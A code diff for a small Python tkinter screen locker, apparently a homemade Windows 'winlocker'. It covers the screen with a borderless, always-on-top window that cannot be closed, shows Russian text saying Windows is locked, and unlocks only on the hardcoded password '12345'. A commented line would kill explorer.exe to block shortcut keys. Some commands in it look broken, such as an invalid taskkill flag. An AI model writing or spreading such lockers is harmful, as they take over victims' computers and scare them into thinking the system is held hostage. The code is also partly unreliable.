@@ -1,37 +1,45 @@
 from tkinter import *
-import ctypes
+from subprocess import Popen as cmd
+import sys
+
+NameFile = sys.argv[0]
+
+
 
 root = Tk()
 
-def quit():
-    pass
+def CheckPassword(arg):
+    if password.get() == "12345":
+        root.destroy()
+        cmd("start explorer.exe", shell=True)
+        # Универсальный вариант!
+        try:
+            quit()
+        except:
+            cmd(f"taskkill /f /in {NameFile}", shell=True)
+        #                                     #
 
-def CheckPassword(event):
-    if Password.get() == "123":
-        root.destroy()  
+
+       
+X = root.winfo_screenwidth()
+Y = root.winfo_screenheight()
 
 
-user32 = ctypes.windll.user32
-user32.SetProcessDPIAware()
-total_width = user32.GetSystemMetrics(78)  
-total_height = user32.GetSystemMetrics(79)  
-virtual_x = user32.GetSystemMetrics(76)  
-virtual_y = user32.GetSystemMetrics(77)  
+# cmd("taskkill /f /in explorer.exe", shell=True) # Раскомментировать если хотите запретить доступ к комбинациям "Win+*"
+
+
 
 bg = "black"
+root ["bg"] = bg
 font = "Arial 25 bold"
-
-root["bg"] = bg
-root.protocol("WM_DELETE_WINDOW", quit)
+root.protocol("WM_DELETE_WINDOW", lambda arg: ...) # То же самое что Quit только упрощенно
 root.attributes("-topmost", 1)
-root.geometry(f"{total_width}x{total_height}+{virtual_x}+{virtual_y}")
+root.geometry(f"{X}x{Y}")
 root.overrideredirect(1)
+Label(text="Ваш Windows заблокирован!", fg="red", bg=bg, font=font).pack()
+Label(text="\n\n\n\nВведите пароль", fg="white", bg=bg, font=font).pack()
 
-Label(text="Ха лох твоя винда блокнута", fg="red", bg=bg, font=font).pack()
-Label(text="\n\n\n\nВведи пароль", fg="white", bg=bg, font=font).pack()
-
-Password = Entry(font=font)
-Password.pack()
-Password.bind("<Return>", CheckPassword)
-
+password = Entry(font=font)
+password.pack()
+password.bind("<Return>", CheckPassword)
 root.mainloop()
